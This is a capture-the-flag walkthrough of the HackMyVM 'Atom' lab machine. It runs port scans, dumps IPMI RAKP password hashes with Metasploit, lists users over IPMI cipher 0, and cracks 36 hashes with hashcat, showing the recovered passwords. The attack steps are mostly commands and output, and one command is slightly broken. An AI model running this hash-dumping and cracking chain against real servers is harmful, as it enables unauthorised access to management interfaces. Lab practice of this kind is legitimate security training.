| Name | Difficulty | OS    | Target IP     | Link                                             |
| ---- | ---------- | ----- | ------------- | ------------------------------------------------ |
| DC01 | Easy       | Linux | 192.168.0.145 | https://hackmyvm.eu/machines/machine.php?vm=Atom |

### ARP Scan

```bash
garffff@garffff:~/hackmyvm/atom$ sudo arp-scan -l | grep 49
192.168.0.145	08:00:27:20:77:49	PCS Systemtechnik GmbH
```

### Nmap Scan - TCP

```bash
garffff@garffff:~/hackmyvm/atom$ sudo nmap -p- -sV -sC 192.168.0.145 -oA nmap/atom.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 19:55 BST
Nmap scan report for 192.168.0.145
Host is up (0.00011s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
MAC Address: 08:00:27:20:77:49 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.96 seconds
```

Not much here, let's scan UDP

### Nmap Scan - UDP

An IPMI port is found:

```bash
garffff@garffff:~/hackmyvm/atom$ sudo nmap -sU --top-ports=100 --open 192.168.0.145 -oA nmap/atom.udp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-30 19:59 BST
Nmap scan report for 192.168.0.145
Host is up (0.00032s latency).
Not shown: 99 closed ports
PORT    STATE SERVICE
623/udp open  asf-rmcp
MAC Address: 08:00:27:20:77:49 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 100.23 seconds

```

Using Metasploit, a module was used to dump hashes from this service:

```bash
garffff@garffff:~/hackmyvm/atom$ sudo msfconsole -q
msf6 > search ipmi hash

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_dumphashes  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ipmi/ipmi_dumphashes

msf6 > use 0
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                                 Required  Description
   ----                  ---------------                                                                 --------  -----------
   CRACK_COMMON          true                                                                            yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                                   no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                                      no        Save captured password hashes in john the ripper format
   PASS_FILE             /opt/metasploit-framework/embedded/framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                                                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                 623                                                                             yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                               yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                               yes       Delay between session retries in seconds
   THREADS               1                                                                               yes       The number of concurrent threads (max one per host)
   USER_FILE             /opt/metasploit-framework/embedded/framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 192.168.0.145
rhosts => 192.168.0.145
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 192.168.0.145:623 - IPMI - Hash found: admin:17d1a5158200000061689070be092ef19bc343a000c4d404d08734d4e03f8a6be90ae15680ccc976a123456789abcdefa123456789abcdef140561646d696e:552ae8d5295b5c50670b9fcde1a1a18f5c5849ac
[+] 192.168.0.145:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Username and password found:

```bash
admin:cukorborso
```

Using these credentials on the SSH service failed:

```bash
garffff@garffff:~/hackmyvm/atom$ ssh admin@192.168.0.145
The authenticity of host '192.168.0.145 (192.168.0.145)' can't be established.
ED25519 key fingerprint is SHA256:La9YyHs4GERVO8XTRRw0cLh6XcInXX35Ar9OiMsXwQk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.145' (ED25519) to the list of known hosts.
admin@192.168.0.145's password: 
Permission denied, please try again.
```

Using ipmitool, it was possible to grab a list of valid users from the IPMI service. No password was needed to log into this service:

```bash
garffff@garffff:~/hackmyvm/atom$ ipmitool -I lanplus -C 0 -H 192.168.0.145 -U admin -P "" user list | ipmi_list.txt
ID  Name	     Callin  Link Auth	IPMI Msg   Channel Priv Limit
1                    true    false      false      Unknown (0x00)
2   admin            true    false      true       ADMINISTRATOR
3   analiese         true    false      true       USER
4   briella          true    false      true       USER
5   richardson       true    false      true       USER
6   carsten          true    false      true       USER
7   sibylle          true    false      true       USER
8   wai-ching        true    false      true       USER
9   jerrilee         true    false      true       USER
10  glynn            true    false      true       USER
11  asia             true    false      true       USER
12  zaylen           true    false      true       USER
13  fabien           true    false      true       USER
14  merola           true    false      true       USER
15  jem              true    false      true       USER
16  riyaz            true    false      true       USER
17  laten            true    false      true       USER
18  cati             true    false      true       USER
19  rozalia          true    false      true       USER
20  palmer           true    false      true       USER
21  onida            true    false      true       USER
22  terra            true    false      true       USER
23  ranga            true    false      true       USER
24  harrie           true    false      true       USER
25  pauly            true    false      true       USER
26  els              true    false      true       USER
27  bqb              true    false      true       USER
28  karlotte         true    false      true       USER
29  zali             true    false      true       USER
30  ende             true    false      true       USER
31  stacey           true    false      true       USER
32  shirin           true    false      true       USER
33  kaki             true    false      true       USER
34  saman            true    false      true       USER
35  kalie            true    false      true       USER
36  deshawn          true    false      true       USER
37  mayeul           true    false      true       USER
38                   true    false      false      Unknown (0x00)
39                   true    false      false      Unknown (0x00)
40                   true    false      false      Unknown (0x00)
41                   true    false      false      Unknown (0x00)
42                   true    false      false      Unknown (0x00)
43                   true    false      false      Unknown (0x00)
44                   true    false      false      Unknown (0x00)
45                   true    false      false      Unknown (0x00)
46                   true    false      false      Unknown (0x00)
47                   true    false      false      Unknown (0x00)
48                   true    false      false      Unknown (0x00)
49                   true    false      false      Unknown (0x00)
50                   true    false      false      Unknown (0x00)
51                   true    false      false      Unknown (0x00)
52                   true    false      false      Unknown (0x00)
53                   true    false      false      Unknown (0x00)
54                   true    false      false      Unknown (0x00)
55                   true    false      false      Unknown (0x00)
56                   true    false      false      Unknown (0x00)
57                   true    false      false      Unknown (0x00)
58                   true    false      false      Unknown (0x00)
59                   true    false      false      Unknown (0x00)
60                   true    false      false      Unknown (0x00)
61                   true    false      false      Unknown (0x00)
62                   true    false      false      Unknown (0x00)
63                   true    false      false      Unknown (0x00)
```

Using this list, I will tidy this up to print only the second column:

```bash
garffff@garffff:~/hackmyvm/atom$ cat ipmi_list.txt | awk '{print $2}' | tee users.txt
Name
true
admin
analiese
briella
richardson
carsten
sibylle
wai-ching
jerrilee
glynn
asia
zaylen
fabien
merola
jem
riyaz
laten
cati
rozalia
palmer
onida
terra
ranga
harrie
pauly
els
bqb
karlotte
zali
ende
stacey
shirin
kaki
saman
kalie
deshawn
mayeul
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
true
```

Tidying up this file up further using `vi` and using `dd` to remove lines that are not needed:

```bash
garffff@garffff:~/hackmyvm/atom$ cat users.txt 
admin
analiese
briella
richardson
carsten
sibylle
wai-ching
jerrilee
glynn
asia
zaylen
fabien
merola
jem
riyaz
laten
cati
rozalia
palmer
onida
terra
ranga
harrie
pauly
els
bqb
karlotte
zali
ende
stacey
shirin
kaki
saman
kalie
deshawn
mayeul
```

Going back to Metasploit's `ipmi_dumphashes`, and using the `OUTPUT_HASHCAT_FILE` function to output any hashes found:

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set USER_FILE users.txt
USER_FILE => users.txt
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE ipmi.hashcat
OUTPUT_HASHCAT_FILE => ipmi.hashcat
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 192.168.0.145:623 - IPMI - Hash found: admin:239f00ed82170000dd18c203240820ebc92bad1a706ccdf9a49f43dc1df19d119d777ea4fdaa2922a123456789abcdefa123456789abcdef140561646d696e:82e5a496de9642628361335e2afc7907a3345914
[+] 192.168.0.145:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[+] 192.168.0.145:623 - IPMI - Hash found: analiese:179f24c404180000da804af1c039a52681df5274156104731b0ac61b87e23f411ab41e79cdaaa70ca123456789abcdefa123456789abcdef1408616e616c69657365:c901b871e0046e0a21f8aa36d4fbdc61f5f3a240
[+] 192.168.0.145:623 - IPMI - Hash found: briella:0f103d6a861800001b42313a5153e70fc5a84c1b8e0477a6428c0913b42e64f0b83f1439c8681baea123456789abcdefa123456789abcdef1407627269656c6c61:a5b9bae1bdd58ab4ed22f2403dd7460f62660310
[+] 192.168.0.145:623 - IPMI - Hash found: richardson:6b5b335908190000e30b230c59afae1cf1b7cd99d1f9d2b08a9a8b420c3f446359ca1937ed543257a123456789abcdefa123456789abcdef140a72696368617264736f6e:b4d4a6bec9167ce67e76718cc6d7c0322801ce6f
[+] 192.168.0.145:623 - IPMI - Hash found: carsten:e856484a8a19000026e0410b6933d1ee18b5e8db9d04b97b08b1d0da1b5df87bda5e9caa3e37a3ada123456789abcdefa123456789abcdef14076361727374656e:c35c614e0b4a1c962cf5e46b2ea7c3b7b3f6b1d4
[+] 192.168.0.145:623 - IPMI - Hash found: sibylle:b7a44b890c1a00004518d867a57e5a4655c5f28cfb013de4bb240418cb6018de8db91b5dac87020fa123456789abcdefa123456789abcdef1407736962796c6c65:77f793c8f2454427e334edeadd2d152f3a272ec7
[+] 192.168.0.145:623 - IPMI - Hash found: wai-ching:bcb6adf08e1a00005d1917a2780dfceef71a3bd74404434f6d029903a1bd5b330a9e4b01a16a531ba123456789abcdefa123456789abcdef14097761692d6368696e67:cfcfe751b8c22ca2d8a47d1789f0feb8ba2acdb6
[+] 192.168.0.145:623 - IPMI - Hash found: jerrilee:6c68fc97101b00009e7646f10a5bc811d71eebaf70272423400c16a9f1512e4c334c25096412224ca123456789abcdefa123456789abcdef14086a657272696c6565:0dce6b1e4345679d43faf0c0dd8c36df6fada53e
[+] 192.168.0.145:623 - IPMI - Hash found: glynn:4ac0db4e921b0000cd3702589448d8eed17ef6b65502f1e5ec4ebaf4841a86a3ea0164d1879de3c0a123456789abcdefa123456789abcdef1405676c796e6e:c6b6c5d7909de3dfaaf68a92ab10a73e50173677
[+] 192.168.0.145:623 - IPMI - Hash found: asia:44c61ed7141c0000df0ea845cc582d5c6bc856f5a63d3e228b7a7050cfca277e0a37285068cc1691a123456789abcdefa123456789abcdef140461736961:773a5cb28a2413c514338eeff507037638f053ed
[+] 192.168.0.145:623 - IPMI - Hash found: zaylen:7ba2e804961c00006e42f0127b28bb0ce47acc69e59e8b23ebcf670b5e35e0d269afa53904376ff9a123456789abcdefa123456789abcdef14067a61796c656e:4ef4e9dc39093dcaa88e7c3e49fc9b43212020e8
[+] 192.168.0.145:623 - IPMI - Hash found: fabien:ccd1a6f6181d0000c5a4abfa80f3cef41809722caabbfa95870b0db81fc306db414342b95f03674aa123456789abcdefa123456789abcdef140666616269656e:206c5429f629cc53805498cb380fadd47be9b53f
[+] 192.168.0.145:623 - IPMI - Hash found: merola:518063379a1d000060a4e61c5d06849be77afac7a85a46aedd0e1ed6fe24b13efee3f92b5adc35c2a123456789abcdefa123456789abcdef14066d65726f6c61:e486e37cd739c2bcb87f8006a22e4f5152c3c849
[+] 192.168.0.145:623 - IPMI - Hash found: jem:316e10761c1e00003e35bd790a242e539f188b73a3603057df2407473098c8dab3d28fbe8411bb2ea123456789abcdefa123456789abcdef14036a656d:cf96a256b28a78ad5e9974641826c46bd405e0f3
[+] 192.168.0.145:623 - IPMI - Hash found: riyaz:259b5dbf9e1e0000e003c2f0dd5626e056f7cf3158bc192a2f301c3556bc5025c4cc4d1a715338e0a123456789abcdefa123456789abcdef1405726979617a:824f0225350bc678c1b043abbe126a22de6c49fb
[+] 192.168.0.145:623 - IPMI - Hash found: laten:198c72d5201f0000d0b4bca79daeeb035b5f2eebb993ba966df4d1746e684adf748bd9a50e1d778fa123456789abcdefa123456789abcdef14056c6174656e:29039a6397e1498746993c74905b5844a1ad9d88
[+] 192.168.0.145:623 - IPMI - Hash found: cati:377da1baa21f00007e154d8411f9e2007c7339597395c58b82d18d08170e4b2b173e4167e1723461a123456789abcdefa123456789abcdef140463617469:d8cb72a74c2b1b7a904f291427a27171ff7ce421
[+] 192.168.0.145:623 - IPMI - Hash found: rozalia:37121dc42420000061d3c767ddb31d37fed9b858f486fa292275a0d23d181af466a31c26c4139855a123456789abcdefa123456789abcdef1407726f7a616c6961:df3699f2e664aa114ab598d8f58e2c92a9088c6f
[+] 192.168.0.145:623 - IPMI - Hash found: palmer:3d91ab5aa62000009ae3a857cdc839d060e9d0cc206dddb314979c7d29037e46ba7dea6aacef908ea123456789abcdefa123456789abcdef140670616c6d6572:53e418b1a15ab1f31f76536124d685988245ec0b
[+] 192.168.0.145:623 - IPMI - Hash found: onida:ac030c952821000072027e7abc997a3b0ee0b27a34c44a5540579ef75c701759464ab06e691abb1ba123456789abcdefa123456789abcdef14056f6e696461:e8c96b3e75bbecf8db963c380ddb5714f774343a
[+] 192.168.0.145:623 - IPMI - Hash found: terra:c8cf2052aa210000672f7159aa011a073051736c7322788537f60454c4e0dee7ca408b3a7186b899a123456789abcdefa123456789abcdef14057465727261:169272ac7b7565f17eef45bb8de4648e48281108
[+] 192.168.0.145:623 - IPMI - Hash found: ranga:9a0122872c2200006212bf7df74ca7693cab29d46d43e9ccc7629a9fd65f3ffd95a87967f96a0fa4a123456789abcdefa123456789abcdef140572616e6761:a22e47aa75e1f9721e26205ba74a5ce5914db6f4
[+] 192.168.0.145:623 - IPMI - Hash found: harrie:b3404360ae2200009844ea243c15c2e8f9ef0899b7feea6910ae372801c8aec1fd29cb01331c8954a123456789abcdefa123456789abcdef1406686172726965:985aad5ca76b77124dd73780a0b13c3cbb5425d9
[+] 192.168.0.145:623 - IPMI - Hash found: pauly:454fe80e30230000eb86104c90214c2c3926426bb31f80d3a3ff844406f70e6b9e51475950416726a123456789abcdefa123456789abcdef14057061756c79:ee7d616f35dd4809cab87e9835d8d5b29e63f513
[+] 192.168.0.145:623 - IPMI - Hash found: els:0fab0444b22300006af79ab70c73953ee27cc94441451e18f12d0382010429e8b50ba05968330e09a123456789abcdefa123456789abcdef1403656c73:3d705f1109c945d3a33fd226158ad0b12eab6761
[+] 192.168.0.145:623 - IPMI - Hash found: bqb:8e0ac69f34240000705d6b6bd8643d4746452adf217530dece3194a23e9333f123cc94c689e8ec71a123456789abcdefa123456789abcdef1403627162:553f9806e3aaf57f03b806c727ee7c32c3f078cf
[+] 192.168.0.145:623 - IPMI - Hash found: karlotte:222da626b624000043650a8011e6e0df6605cef7e7728cae14ea3ec69b295c4549122d5b0bfb1ccfa123456789abcdefa123456789abcdef14086b61726c6f747465:3f60520b4cc23785ba80ea2938b73879cc1c7a21
[+] 192.168.0.145:623 - IPMI - Hash found: zali:1cc523df3825000015da1b7e7109fccb8535a98606cd9545eb6c1feeaa6cae092b091c4f38b963e2a123456789abcdefa123456789abcdef14047a616c69:637f0ca3423420f25c0a4ec7b68370883da7ac73
[+] 192.168.0.145:623 - IPMI - Hash found: ende:6c5831b2ba250000b9bb9470c58c497d6ded8b5c4e15f211eb85caf7bb50b48a729fcf4567f5c059a123456789abcdefa123456789abcdef1404656e6465:7f7cdddbd0d60dc5b3ea768f0f94921e1172f92c
[+] 192.168.0.145:623 - IPMI - Hash found: stacey:bf0ead8d3c2600001515eaf5d33c9c4c43c687ba32d7b030e1a1028d03b27bfeda512433df919324a123456789abcdefa123456789abcdef1406737461636579:d1916b6f2d54b79a40cabb7170fd285722987cc3
[+] 192.168.0.145:623 - IPMI - Hash found: shirin:7fb9146ebe260000d17d833bb518a74ff0a511805c97924deb51efe420c6b063ac9aed6122ce714fa123456789abcdefa123456789abcdef140673686972696e:88ff3b95be12e43494627f503dfea9e0f3141b9b
[+] 192.168.0.145:623 - IPMI - Hash found: kaki:7016c1f940270000743777992cea187da86338bf802de2b9964f9c67f313d2082ec646893f3dd357a123456789abcdefa123456789abcdef14046b616b69:a11056704ead3b102e115683363b3f3387dab94d
[+] 192.168.0.145:623 - IPMI - Hash found: saman:7b73e16fc2270000f847030795994ed6ecea4b0f1ebc6e9441cd1b01bbfaf4b99953201049595c7da123456789abcdefa123456789abcdef140573616d616e:9469e864e47703ff5241315fb500016d9d705acc
[+] 192.168.0.145:623 - IPMI - Hash found: kalie:9980b35644280000d58a1ba96a778c96d0a1b1e14bccfec0fcb9d6313be13a7b699ecf1535654a9fa123456789abcdefa123456789abcdef14056b616c6965:62dd5192db2ed5172d35fd911a72eb26d51ae912
[+] 192.168.0.145:623 - IPMI - Hash found: deshawn:6867d5e6c628000050fc601e81774e7651c73c263627ae866e6820dfb756f043d7180df363edc015a123456789abcdefa123456789abcdef14076465736861776e:dd5efe43406af27e5ad991792ff41cd526b784f1
[+] 192.168.0.145:623 - IPMI - Hash found: mayeul:4e345c2948290000f845aa4beea4deb884eafdebeb6a151ceef690c5150369b14c12c2d4d10bae37a123456789abcdefa123456789abcdef14066d617965756c:5cfa081f152b51e52ec95d910bfdd72614d915b5
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The hashes have been saved in the file `ipmi.hashcat`:

```bash
garffff@garffff:~/hackmyvm/atom$ ls -lash
total 52K
4.0K drwxrwxr-x 3 garffff garffff 4.0K Jul 30 20:13 .
4.0K drwxrwxr-x 6 garffff garffff 4.0K Jul 30 19:53 ..
 16K -rw-r--r-- 1 root   root   6.7K Jul 30 20:13 ipmi.hashcat
 12K -rw-rw-r-- 1 garffff garffff 3.8K Jul 30 20:08 ipmi_list.txt
4.0K drwxrwxr-x 2 garffff garffff 4.0K Jul 30 19:55 nmap
 12K -rw-rw-r-- 1 garffff garffff  241 Jul 30 20:11 users.txt
```

### Hashcat 

Using Hashcat, it was possible to extract the clear text passwords for the hashes found:

```bash
garffff@garffff:~/hackmyvm/atom$ hashcat -m 7300 ipmi.hashcat /opt/rockyou.txt --username
hashcat (v6.2.6-707-g91095845b) starting

Successfully initialized the NVIDIA main driver CUDA runtime library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
             CUDA SDK Toolkit required for proper device support and utilization.
             For more information, see: https://hashcat.net/faq/wrongdriver
             Falling back to OpenCL runtime.

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 3.0 CUDA 12.2.148) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1080 Ti, 10048/11164 MB (2791 MB allocatable), 28MCU

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=====================================================================================================================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 36 digests; 36 unique digests, 36 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 491 MB

Dictionary cache built:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

0f103d6a861800001b42313a5153e70fc5a84c1b8e0477a6428c0913b42e64f0b83f1439c8681baea123456789abcdefa123456789abcdef1407627269656c6c61:a5b9bae1bdd58ab4ed22f2403dd7460f62660310:jesus06
0fab0444b22300006af79ab70c73953ee27cc94441451e18f12d0382010429e8b50ba05968330e09a123456789abcdefa123456789abcdef1403656c73:3d705f1109c945d3a33fd226158ad0b12eab6761:dezzy
179f24c404180000da804af1c039a52681df5274156104731b0ac61b87e23f411ab41e79cdaaa70ca123456789abcdefa123456789abcdef1408616e616c69657365:c901b871e0046e0a21f8aa36d4fbdc61f5f3a240:honda
198c72d5201f0000d0b4bca79daeeb035b5f2eebb993ba966df4d1746e684adf748bd9a50e1d778fa123456789abcdefa123456789abcdef14056c6174656e:29039a6397e1498746993c74905b5844a1ad9d88:trick1
1cc523df3825000015da1b7e7109fccb8535a98606cd9545eb6c1feeaa6cae092b091c4f38b963e2a123456789abcdefa123456789abcdef14047a616c69:637f0ca3423420f25c0a4ec7b68370883da7ac73:poynter
222da626b624000043650a8011e6e0df6605cef7e7728cae14ea3ec69b295c4549122d5b0bfb1ccfa123456789abcdefa123456789abcdef14086b61726c6f747465:3f60520b4cc23785ba80ea2938b73879cc1c7a21:emeralds
259b5dbf9e1e0000e003c2f0dd5626e056f7cf3158bc192a2f301c3556bc5025c4cc4d1a715338e0a123456789abcdefa123456789abcdef1405726979617a:824f0225350bc678c1b043abbe126a22de6c49fb:djones
316e10761c1e00003e35bd790a242e539f188b73a3603057df2407473098c8dab3d28fbe8411bb2ea123456789abcdefa123456789abcdef14036a656d:cf96a256b28a78ad5e9974641826c46bd405e0f3:081704
37121dc42420000061d3c767ddb31d37fed9b858f486fa292275a0d23d181af466a31c26c4139855a123456789abcdefa123456789abcdef1407726f7a616c6961:df3699f2e664aa114ab598d8f58e2c92a9088c6f:batman!
377da1baa21f00007e154d8411f9e2007c7339597395c58b82d18d08170e4b2b173e4167e1723461a123456789abcdefa123456789abcdef140463617469:d8cb72a74c2b1b7a904f291427a27171ff7ce421:122987
3d91ab5aa62000009ae3a857cdc839d060e9d0cc206dddb314979c7d29037e46ba7dea6aacef908ea123456789abcdefa123456789abcdef140670616c6d6572:53e418b1a15ab1f31f76536124d685988245ec0b:phones
44c61ed7141c0000df0ea845cc582d5c6bc856f5a63d3e228b7a7050cfca277e0a37285068cc1691a123456789abcdefa123456789abcdef140461736961:773a5cb28a2413c514338eeff507037638f053ed:TWEETY1
454fe80e30230000eb86104c90214c2c3926426bb31f80d3a3ff844406f70e6b9e51475950416726a123456789abcdefa123456789abcdef14057061756c79:ee7d616f35dd4809cab87e9835d8d5b29e63f513:515253
4ac0db4e921b0000cd3702589448d8eed17ef6b65502f1e5ec4ebaf4841a86a3ea0164d1879de3c0a123456789abcdefa123456789abcdef1405676c796e6e:c6b6c5d7909de3dfaaf68a92ab10a73e50173677:evan
4e345c2948290000f845aa4beea4deb884eafdebeb6a151ceef690c5150369b14c12c2d4d10bae37a123456789abcdefa123456789abcdef14066d617965756c:5cfa081f152b51e52ec95d910bfdd72614d915b5:241107
518063379a1d000060a4e61c5d06849be77afac7a85a46aedd0e1ed6fe24b13efee3f92b5adc35c2a123456789abcdefa123456789abcdef14066d65726f6c61:e486e37cd739c2bcb87f8006a22e4f5152c3c849:mackenzie2
6867d5e6c628000050fc601e81774e7651c73c263627ae866e6820dfb756f043d7180df363edc015a123456789abcdefa123456789abcdef14076465736861776e:dd5efe43406af27e5ad991792ff41cd526b784f1:milo123
6b5b335908190000e30b230c59afae1cf1b7cd99d1f9d2b08a9a8b420c3f446359ca1937ed543257a123456789abcdefa123456789abcdef140a72696368617264736f6e:b4d4a6bec9167ce67e76718cc6d7c0322801ce6f:darell
6c5831b2ba250000b9bb9470c58c497d6ded8b5c4e15f211eb85caf7bb50b48a729fcf4567f5c059a123456789abcdefa123456789abcdef1404656e6465:7f7cdddbd0d60dc5b3ea768f0f94921e1172f92c:tripod
6c68fc97101b00009e7646f10a5bc811d71eebaf70272423400c16a9f1512e4c334c25096412224ca123456789abcdefa123456789abcdef14086a657272696c6565:0dce6b1e4345679d43faf0c0dd8c36df6fada53e:number17
7016c1f940270000743777992cea187da86338bf802de2b9964f9c67f313d2082ec646893f3dd357a123456789abcdefa123456789abcdef14046b616b69:a11056704ead3b102e115683363b3f3387dab94d:numberone
7b73e16fc2270000f847030795994ed6ecea4b0f1ebc6e9441cd1b01bbfaf4b99953201049595c7da123456789abcdefa123456789abcdef140573616d616e:9469e864e47703ff5241315fb500016d9d705acc:090506
7ba2e804961c00006e42f0127b28bb0ce47acc69e59e8b23ebcf670b5e35e0d269afa53904376ff9a123456789abcdefa123456789abcdef14067a61796c656e:4ef4e9dc39093dcaa88e7c3e49fc9b43212020e8:120691
7fb9146ebe260000d17d833bb518a74ff0a511805c97924deb51efe420c6b063ac9aed6122ce714fa123456789abcdefa123456789abcdef140673686972696e:88ff3b95be12e43494627f503dfea9e0f3141b9b:kittyboo
8e0ac69f34240000705d6b6bd8643d4746452adf217530dece3194a23e9333f123cc94c689e8ec71a123456789abcdefa123456789abcdef1403627162:553f9806e3aaf57f03b806c727ee7c32c3f078cf:290992
9980b35644280000d58a1ba96a778c96d0a1b1e14bccfec0fcb9d6313be13a7b699ecf1535654a9fa123456789abcdefa123456789abcdef14056b616c6965:62dd5192db2ed5172d35fd911a72eb26d51ae912:billandben
9a0122872c2200006212bf7df74ca7693cab29d46d43e9ccc7629a9fd65f3ffd95a87967f96a0fa4a123456789abcdefa123456789abcdef140572616e6761:a22e47aa75e1f9721e26205ba74a5ce5914db6f4:jaffa1
ac030c952821000072027e7abc997a3b0ee0b27a34c44a5540579ef75c701759464ab06e691abb1ba123456789abcdefa123456789abcdef14056f6e696461:e8c96b3e75bbecf8db963c380ddb5714f774343a:jiggaman
b3404360ae2200009844ea243c15c2e8f9ef0899b7feea6910ae372801c8aec1fd29cb01331c8954a123456789abcdefa123456789abcdef1406686172726965:985aad5ca76b77124dd73780a0b13c3cbb5425d9:071590
b7a44b890c1a00004518d867a57e5a4655c5f28cfb013de4bb240418cb6018de8db91b5dac87020fa123456789abcdefa123456789abcdef1407736962796c6c65:77f793c8f2454427e334edeadd2d152f3a272ec7:me4life
bcb6adf08e1a00005d1917a2780dfceef71a3bd74404434f6d029903a1bd5b330a9e4b01a16a531ba123456789abcdefa123456789abcdef14097761692d6368696e67:cfcfe751b8c22ca2d8a47d1789f0feb8ba2acdb6:10101979
bf0ead8d3c2600001515eaf5d33c9c4c43c687ba32d7b030e1a1028d03b27bfeda512433df919324a123456789abcdefa123456789abcdef1406737461636579:d1916b6f2d54b79a40cabb7170fd285722987cc3:castillo1
c8cf2052aa210000672f7159aa011a073051736c7322788537f60454c4e0dee7ca408b3a7186b899a123456789abcdefa123456789abcdef14057465727261:169272ac7b7565f17eef45bb8de4648e48281108:sexymoma
ccd1a6f6181d0000c5a4abfa80f3cef41809722caabbfa95870b0db81fc306db414342b95f03674aa123456789abcdefa123456789abcdef140666616269656e:206c5429f629cc53805498cb380fadd47be9b53f:chatroom
e856484a8a19000026e0410b6933d1ee18b5e8db9d04b97b08b1d0da1b5df87bda5e9caa3e37a3ada123456789abcdefa123456789abcdef14076361727374656e:c35c614e0b4a1c962cf5e46b2ea7c3b7b3f6b1d4:2468
239f00ed82170000dd18c203240820ebc92bad1a706ccdf9a49f43dc1df19d119d777ea4fdaa2922a123456789abcdefa123456789abcdef140561646d696e:82e5a496de9642628361335e2afc7907a3345914:cukorborso
```

The output of the cracked passwords were saved to a separate file `ipmi_cracked.txt`:

```bash
garffff@garffff:~/hackmyvm/atom$ hashcat -m 7300 ipmi.hashcat --username --show | tee ipmi_cracked.txt
Mixing --show with --username can cause exponential delay in output.

192.168.0.145 admin:239f00ed82170000dd18c203240820ebc92bad1a706ccdf9a49f43dc1df19d119d777ea4fdaa2922a123456789abcdefa123456789abcdef140561646d696e:82e5a496de9642628361335e2afc7907a3345914:cukorborso
192.168.0.145 analiese:179f24c404180000da804af1c039a52681df5274156104731b0ac61b87e23f411ab41e79cdaaa70ca123456789abcdefa123456789abcdef1408616e616c69657365:c901b871e0046e0a21f8aa36d4fbdc61f5f3a240:honda
192.168.0.145 briella:0f103d6a861800001b42313a5153e70fc5a84c1b8e0477a6428c0913b42e64f0b83f1439c8681baea123456789abcdefa123456789abcdef1407627269656c6c61:a5b9bae1bdd58ab4ed22f2403dd7460f62660310:jesus06
192.168.0.145 richardson:6b5b335908190000e30b230c59afae1cf1b7cd99d1f9d2b08a9a8b420c3f446359ca1937ed543257a123456789abcdefa123456789abcdef140a72696368617264736f6e:b4d4a6bec9167ce67e76718cc6d7c0322801ce6f:darell
192.168.0.145 carsten:e856484a8a19000026e0410b6933d1ee18b5e8db9d04b97b08b1d0da1b5df87bda5e9caa3e37a3ada123456789abcdefa123456789abcdef14076361727374656e:c35c614e0b4a1c962cf5e46b2ea7c3b7b3f6b1d4:2468
192.168.0.145 sibylle:b7a44b890c1a00004518d867a57e5a4655c5f28cfb013de4bb240418cb6018de8db91b5dac87020fa123456789abcdefa123456789abcdef1407736962796c6c65:77f793c8f2454427e334edeadd2d152f3a272ec7:me4life
192.168.0.145 wai-ching:bcb6adf08e1a00005d1917a2780dfceef71a3bd74404434f6d029903a1bd5b330a9e4b01a16a531ba123456789abcdefa123456789abcdef14097761692d6368696e67:cfcfe751b8c22ca2d8a47d1789f0feb8ba2acdb6:10101979
